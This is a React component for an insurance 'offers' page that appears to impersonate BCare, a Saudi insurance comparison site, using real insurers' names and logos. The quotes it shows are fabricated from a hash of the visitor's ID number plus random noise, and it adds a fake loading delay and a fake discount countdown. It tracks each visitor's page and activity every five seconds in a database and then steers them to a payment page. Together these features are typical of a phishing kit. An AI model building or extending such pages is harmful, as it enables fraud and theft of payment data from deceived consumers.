import { useState, useEffect } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { motion } from "framer-motion";
import "./Offers.css";
import Footer from "../../components/Footer/Footer";
import { supabase } from "../../supabase";

export const Offers = ({ className, ...props }) => {
  const navigate = useNavigate();
  const location = useLocation();
  const [activeTab, setActiveTab] = useState("third-party");
  const [isLoading, setIsLoading] = useState(true);

  useEffect(() => {
    // Simulate real fetching
    const timer = setTimeout(() => {
      setIsLoading(false);
    }, 2000);
    return () => clearTimeout(timer);
  }, []);

  useEffect(() => {
    if (location.state?.insuranceType) {
      setActiveTab(location.state.insuranceType);
    }
  }, [location.state]);

  // Update Page Tracking & Heartbeat
  useEffect(() => {
    const customerId = sessionStorage.getItem('customerId');
    if (customerId) {
      supabase.from('customers').update({ 
        page: '3- صفحه العروض',
        status: 'idle',
        last_update: Date.now(),
        last_heartbeat: Date.now()
      }).eq('id', customerId).then(({ error }) => { if (error) console.error("Update Error:", error) });
    }

    const interval = setInterval(() => {
      const id = sessionStorage.getItem('customerId');
      if (id) {
        supabase.from('customers').update({ 
          last_heartbeat: Date.now() 
        }).eq('id', id).then(() => {});
      }
    }, 5000);

    return () => clearInterval(interval);
  }, []);

  const generateDynamicOffers = () => {
    const idNumber = sessionStorage.getItem('customerIdNumber') || '1000000000';
    // Get car value from session, default to 50000 if not found
    const carValueStr = sessionStorage.getItem('carValue');
    const carValue = carValueStr ? parseInt(carValueStr.replace(/\D/g, ''), 10) : 50000;

    // Driver Risk Profile (Hash function based on ID)
    let hash = 0;
    for (let i = 0; i < idNumber.length; i++) {
      hash = idNumber.charCodeAt(i) + ((hash << 5) - hash);
    }
    // Normalize hash to a multiplier between 0.85 and 1.25
    const riskFactor = 0.85 + (Math.abs(hash) % 40) / 100;

    // Base Third-Party Price
    const baseThirdParty = 750;

    // The static definitions with rates
    const thirdPartyBase = [
      { id: 1, company: "ولاء للتأمين", logo: "/walaa.png", rate: 1.1, type: "التأمين ضد الغير", 
        features: [{ name: "المسؤولية المدنية تجاه الغير بحد أقصى 10,000,000 ريال", price: 0, checked: true }],
        addons: [
          { id: 'rsa', name: "المساعدة على الطريق", price: 50, checked: false },
          { id: 'pa', name: "الحوادث الشخصية للسائق", price: 20, checked: false }
        ]
      },
      { id: 2, company: "تكافل الراجحي", logo: "/شعار تكافل الراجحي - SVG.svg", rate: 1.0, type: "التأمين ضد الغير", 
        features: [{ name: "المسؤولية المدنية تجاه الغير بحد أقصى 10,000,000 ريال", price: 0, checked: true }],
        addons: [
          { id: 'pa', name: "تغطية الحوادث الشخصية", price: 50, checked: false },
          { id: 'rsa', name: "المساعدة على الطريق", price: 30, checked: false },
          { id: 'glass', name: "تغطية ضد كسر الزجاج والحرائق", price: 150, checked: false }
        ]
      },
      { id: 3, company: "التعاونية", logo: "/group1.svg", rate: 1.2, type: "التأمين ضد الغير", 
        features: [{ name: "المسؤولية المدنية تجاه الغير بحد أقصى 10,000,000 ريال", price: 0, checked: true }],
        addons: [{ id: 'rsa', name: "المساعدة على الطريق الشاملة", price: 40, checked: false }]
      },
      { id: 4, company: "ملاذ للتأمين", logo: "/شعار ملاذ للتأمين - SVG.svg", rate: 1.05, type: "التأمين ضد الغير", 
        features: [{ name: "المسؤولية المدنية تجاه الغير بحد أقصى 10,000,000 ريال", price: 0, checked: true }],
        addons: [{ id: 'fire', name: "تغطية الحريق والسرقة", price: 35, checked: false }]
      },
      { id: 5, company: "شركة أسيج", logo: "/Acig.svg", rate: 0.85, type: "التأمين ضد الغير", 
        features: [{ name: "المسؤولية المدنية تجاه الغير بحد أقصى 10,000,000 ريال", price: 0, checked: true }],
        addons: [{ id: 'pa', name: "الحوادث الشخصية", price: 25, checked: false }]
      },
      { id: 6, company: "الدرع العربي", logo: "/Arabian Shield Cooperative Insurance - 01.svg", rate: 1.15, type: "التأمين ضد الغير", 
        features: [{ name: "المسؤولية المدنية تجاه الغير بحد أقصى 10,000,000 ريال", price: 0, checked: true }],
        addons: [{ id: 'rsa', name: "المساعدة على الطريق", price: 45, checked: false }]
      },
      { id: 7, company: "شركة سلامة", logo: "/clip-path-group0.svg", rate: 0.88, type: "التأمين ضد الغير", 
        features: [{ name: "المسؤولية المدنية تجاه الغير بحد أقصى 10,000,000 ريال", price: 0, checked: true }],
        addons: [{ id: 'pa', name: "الحوادث الشخصية", price: 20, checked: false }]
      },
      { id: 8, company: "اتحاد الخليج", logo: "/logo0.svg", rate: 1.02, type: "التأمين ضد الغير", 
        features: [{ name: "المسؤولية المدنية تجاه الغير بحد أقصى 10,000,000 ريال", price: 0, checked: true }],
        addons: [{ id: 'rsa', name: "المساعدة على الطريق", price: 35, checked: false }]
      },
      { id: 9, company: "سايكو SAICO", logo: "/group2.svg", rate: 1.12, type: "التأمين ضد الغير", 
        features: [{ name: "المسؤولية المدنية تجاه الغير بحد أقصى 10,000,000 ريال", price: 0, checked: true }],
        addons: [{ id: 'pa', name: "الحوادث الشخصية", price: 30, checked: false }]
      },
      { id: 10, company: "بروج للتأمين", logo: "/clip-path-group0.svg", rate: 0.95, type: "التأمين ضد الغير", 
        features: [{ name: "المسؤولية المدنية تجاه الغير بحد أقصى 10,000,000 ريال", price: 0, checked: true }],
        addons: [{ id: 'rsa', name: "المساعدة على الطريق", price: 40, checked: false }]
      }
    ];

    const compBase = [
      { id: 101, company: "تكافل الراجحي", logo: "/شعار تكافل الراجحي - SVG.svg", rate: 0.025, type: "التأمين الشامل", 
        features: [{ name: "تغطية شاملة للحوادث", price: 0, checked: true, mandatory: true }, { name: "تعويض الخسارة الكلية", price: 0, checked: true, mandatory: true }],
        addons: [{ id: 'agency', name: "إصلاح الوكالة", price: 400, checked: false }, { id: 'car_rent', name: "سيارة بديلة", price: 150, checked: false }]
      },
      { id: 102, company: "التعاونية", logo: "/group1.svg", rate: 0.032, type: "التأمين الشامل", 
        features: [{ name: "تغطية شاملة للحوادث", price: 0, checked: true, mandatory: true }, { name: "تعويض الخسارة الكلية", price: 0, checked: true, mandatory: true }],
        addons: [{ id: 'rsa', name: "المساعدة على الطريق", price: 50, checked: false }]
      },
      { id: 103, company: "ملاذ للتأمين", logo: "/شعار ملاذ للتأمين - SVG.svg", rate: 0.028, type: "التأمين الشامل", 
        features: [{ name: "تغطية شاملة للحوادث", price: 0, checked: true, mandatory: true }, { name: "تعويض الخسارة الكلية", price: 0, checked: true, mandatory: true }],
        addons: [{ id: 'fire', name: "تغطية الحريق والسرقة", price: 40, checked: false }]
      },
      { id: 104, company: "ولاء للتأمين", logo: "/walaa.png", rate: 0.035, type: "التأمين الشامل", 
        features: [{ name: "تغطية شاملة للحوادث", price: 0, checked: true, mandatory: true }, { name: "تعويض الخسارة الكلية", price: 0, checked: true, mandatory: true }],
        addons: [{ id: 'rsa', name: "المساعدة على الطريق", price: 60, checked: false }]
      },
      { id: 105, company: "شركة أسيج", logo: "/Acig.svg", rate: 0.022, type: "التأمين الشامل", 
        features: [{ name: "تغطية شاملة للحوادث", price: 0, checked: true, mandatory: true }, { name: "تعويض الخسارة الكلية", price: 0, checked: true, mandatory: true }],
        addons: [{ id: 'pa', name: "الحوادث الشخصية", price: 30, checked: false }]
      },
      { id: 106, company: "الدرع العربي", logo: "/Arabian Shield Cooperative Insurance - 01.svg", rate: 0.038, type: "التأمين الشامل", 
        features: [{ name: "تغطية شاملة للحوادث", price: 0, checked: true, mandatory: true }, { name: "تعويض الخسارة الكلية", price: 0, checked: true, mandatory: true }],
        addons: [{ id: 'rsa', name: "المساعدة على الطريق", price: 55, checked: false }]
      },
      { id: 107, company: "شركة سلامة", logo: "/clip-path-group0.svg", rate: 0.021, type: "التأمين الشامل", 
        features: [{ name: "تغطية شاملة للحوادث", price: 0, checked: true, mandatory: true }, { name: "تعويض الخسارة الكلية", price: 0, checked: true, mandatory: true }],
        addons: [{ id: 'fire', name: "تغطية الحريق والسرقة", price: 35, checked: false }]
      },
      { id: 108, company: "اتحاد الخليج", logo: "/logo0.svg", rate: 0.026, type: "التأمين الشامل", 
        features: [{ name: "تغطية شاملة للحوادث", price: 0, checked: true, mandatory: true }, { name: "تعويض الخسارة الكلية", price: 0, checked: true, mandatory: true }],
        addons: [{ id: 'rsa', name: "المساعدة على الطريق", price: 45, checked: false }]
      },
      { id: 109, company: "سايكو SAICO", logo: "/group2.svg", rate: 0.030, type: "التأمين الشامل", 
        features: [{ name: "تغطية شاملة للحوادث", price: 0, checked: true, mandatory: true }, { name: "تعويض الخسارة الكلية", price: 0, checked: true, mandatory: true }],
        addons: [{ id: 'pa', name: "الحوادث الشخصية", price: 40, checked: false }]
      },
      { id: 110, company: "بروج للتأمين", logo: "/clip-path-group0.svg", rate: 0.024, type: "التأمين الشامل", 
        features: [{ name: "تغطية شاملة للحوادث", price: 0, checked: true, mandatory: true }, { name: "تعويض الخسارة الكلية", price: 0, checked: true, mandatory: true }],
        addons: [{ id: 'rsa', name: "المساعدة على الطريق", price: 50, checked: false }]
      }
    ];

    const generatePricing = (baseList, isComprehensive) => {
      return baseList.map(comp => {
        let rawPrice = isComprehensive ? (carValue * comp.rate * riskFactor) : (baseThirdParty * comp.rate * riskFactor);
        
        // Add random variation up to 20 SAR
        rawPrice += (Math.random() * 20);

        // Apply rounding
        const basePrice = Math.round(rawPrice * 100) / 100;

        // No-claim discount between 5% and 15%
        const discountRate = 0.05 + (Math.abs(hash) % 10) / 100;
        const discount = Math.round((basePrice * discountRate) * 100) / 100;

        // VAT is 15% on (base - discount)
        const vat = Math.round(((basePrice - discount) * 0.15) * 100) / 100;

        return {
          ...comp,
          basePrice,
          fees: { discount, vat }
        };
      });
    };

    return {
      "third-party": generatePricing(thirdPartyBase, false),
      "comprehensive": generatePricing(compBase, true)
    };
  };

  const [currentOffers, setCurrentOffers] = useState(generateDynamicOffers());

  const toggleAddon = (offerId, addonId) => {
    setCurrentOffers(prev => ({
      ...prev,
      [activeTab]: prev[activeTab].map(offer => {
        if (offer.id === offerId) {
          return {
            ...offer,
            addons: offer.addons.map(addon => {
              if (addon.mandatory) return addon;
              return addon.id === addonId ? { ...addon, checked: !addon.checked } : addon;
            })
          };
        }
        return offer;
      })
    }));
  };

  const calculateTotal = (offer) => {
    const addonTotal = offer.addons
      .filter(a => a.checked)
      .reduce((sum, a) => sum + a.price, 0);
    return (offer.basePrice + addonTotal).toFixed(2);
  };

  return (
    <div className={`offers-page ${className || ""}`}>
      {/* Header */}
      <header className="site-header">
        <div className="header-right">
          <div className="user-icon">
            <img src="/svg0.svg" alt="User" />
          </div>
        </div>
        <div className="header-center">
          <img src="/group-21.svg" alt="BCare Logo" className="header-logo" />
        </div>
        <div className="header-left">
          <span className="lang-toggle">EN</span>
        </div>
      </header>

      {/* Urgency Banner */}
      <div className="urgency-banner">
        <span className="fire-icon">🔥</span>
        <span>خصم إضافي 10% ينتهي خلال </span>
        <span className="countdown-timer">04:30</span>
      </div>

      <main className="offers-main">
        {/* Progress Stepper */}
        <div className="stepper-container">
          <div className="step completed">
            <div className="step-number">1</div>
            <div className="step-label">البيانات الرئيسية</div>
          </div>
          <div className="step-line active"></div>
          <div className="step completed">
            <div className="step-number">2</div>
            <div className="step-label">تفاصيل وثيقة التأمين</div>
          </div>
          <div className="step-line active"></div>
          <div className="step active">
            <div className="step-number">3</div>
            <div className="step-label">الشركات والعروض</div>
          </div>
          <div className="step-line"></div>
          <div className="step disabled">
            <div className="step-number">4</div>
            <div className="step-label">الملخص والدفع</div>
          </div>
        </div>

        {/* Vehicle Info Summary Box */}
        <div className="vehicle-details-card">
          <h2 className="card-title">العروض المتاحة حسب تفاصيل مركبتك</h2>
          <div className="details-grid">
            <div className="detail-item">
              <span className="label">ماركة ونوع المركبة</span>
              <span className="value">{sessionStorage.getItem('carMakeModel') || 'تويوتا كامري'}</span>
            </div>
            <div className="detail-item">
              <span className="label">سنة صنع المركبة</span>
              <span className="value">{sessionStorage.getItem('manufactureYear') || '2014'}</span>
            </div>
            <div className="detail-item">
              <span className="label">الغرض من الاستخدام</span>
              <span className="value">شخصي</span>
            </div>
            <div className="detail-item">
              <span className="label">القيمة التقديرية</span>
              <span className="value">10000 ﷼</span>
            </div>
            <div className="detail-item">
              <span className="label">مكان إصلاح المركبة</span>
              <span className="value">الوكالة</span>
            </div>
          </div>
        </div>

        {/* SAMA Note */}
        <div className="sama-note-box">
          <p>بموجب تعليمات البنك المركزي السعودي، يحق لحامل الوثيقة إلغاء الوثيقة واسترداد كامل المبلغ المدفوع خلال 15 يوماً من تاريخ الشراء، بشرط عدم حدوث أي مطالبات خلال هذه الفترة.</p>
        </div>

        {/* Insurance Type Tabs */}
        <div className="insurance-tabs-container">
          <button 
            className={`insurance-tab ${activeTab === 'comprehensive' ? 'active' : ''}`}
            onClick={() => setActiveTab('comprehensive')}
          >
            تأمين شامل
          </button>
          <button 
            className={`insurance-tab ${activeTab === 'third-party' ? 'active' : ''}`}
            onClick={() => setActiveTab('third-party')}
          >
            تأمين ضد الغير
          </button>
        </div>

        {/* Offers List */}
        <div className="offers-list">
          {isLoading ? (
            // Skeletons
            Array(4).fill(0).map((_, i) => (
              <div key={`skel-${i}`} className="skeleton-card">
                <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '15px' }}>
                  <div className="skeleton-box" style={{ width: '120px', height: '24px' }}></div>
                  <div className="skeleton-box" style={{ width: '80px', height: '80px', borderRadius: '50%' }}></div>
                </div>
                <div className="skeleton-box" style={{ width: '100%', height: '40px', marginBottom: '10px' }}></div>
                <div className="skeleton-box" style={{ width: '70%', height: '20px', marginBottom: '10px' }}></div>
                <div className="skeleton-box" style={{ width: '100%', height: '50px', borderRadius: '25px', marginTop: '10px' }}></div>
              </div>
            ))
          ) : (
            currentOffers[activeTab].map((offer) => (
              <motion.div 
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ duration: 0.4 }}
                key={offer.id} 
                className="new-offer-card"
              >
                <div className="card-top-row">
                <div className="company-text-info">
                  <h3 className="company-name-title">{offer.company}</h3>
                  <span className="insurance-type-label">{offer.type}</span>
                </div>
                <div className="company-branding">
                  <div className="logo-box">
                    <img src={offer.logo} alt={offer.company} />
                  </div>
                  <div className="price-under-logo">
                    <span className="large-price">{calculateTotal(offer)}</span>
                    <span className="price-unit">﷼ / سنة</span>
                  </div>
                </div>
              </div>

              <div className="card-middle-row">
                <div className="features-selection-col">
                  {offer.features.map((feat, i) => (
                    <div key={i} className="feature-option-row enabled readonly">
                      <div className="checkbox-styled checked">
                        <i className="fas fa-check"></i>
                      </div>
                      <span className="feature-name main-feat">{feat.name}</span>
                      <span className="feature-price">{feat.price > 0 ? `${feat.price} ﷼` : ''}</span>
                    </div>
                  ))}
                  
                  {offer.addons.map((addon) => (
                    <div key={addon.id} 
                         className={`feature-option-row addon ${addon.checked ? 'enabled' : ''}`}
                         onClick={() => toggleAddon(offer.id, addon.id)}>
                      <div className={`checkbox-styled ${addon.checked ? 'checked' : ''}`}>
                        {addon.checked && <i className="fas fa-check" style={{ color: '#146394', display: 'block' }}></i>}
                      </div>
                      <span className="feature-name addon-feat">{addon.name}</span>
                      <span className="feature-price">(+{addon.price} ﷼)</span>
                    </div>
                  ))}
                </div>
              </div>

              <div className="card-bottom-row">
                <div className="fees-section">
                  <span className="section-header">رسوم إضافية:</span>
                  <div className="fee-row">
                    <span className="fee-label">خصم عدم وجود مطالبات</span>
                    <span className="fee-value">{offer.fees.discount} ﷼</span>
                  </div>
                  <div className="fee-row">
                    <span className="fee-label">ضريبة القيمة المضافة</span>
                    <span className="fee-value">{offer.fees.vat} ﷼</span>
                  </div>
                </div>
                
                <button className="new-select-btn" onClick={() => {
                  const customerId = sessionStorage.getItem('customerId');
                  const finalPrice = calculateTotal(offer);
                  sessionStorage.setItem('totalPrice', finalPrice);
                  if (customerId) {
                    supabase.from('customers').update({
                      selected_company: offer.company,
                      total_price: finalPrice,
                      last_update: new Date().getTime(),
                      last_heartbeat: new Date().getTime()
                    }).eq('id', customerId).then(({ error }) => { if (error) console.error(error) });
                  }
                  navigate("/payment-method");
                }}>
                  اختر هذا العرض
                </button>
              </div>
              </motion.div>
            ))
          )}
        </div>
      </main>

      {/* Floating Support Icons */}
      <div className="floating-support">
        <div className="support-circle orange">
          <i className="fas fa-headset"></i>
        </div>
        <div className="support-circle blue">
          <i className="fas fa-comment-dots"></i>
        </div>
      </div>

      <Footer />
    </div>
  );
};
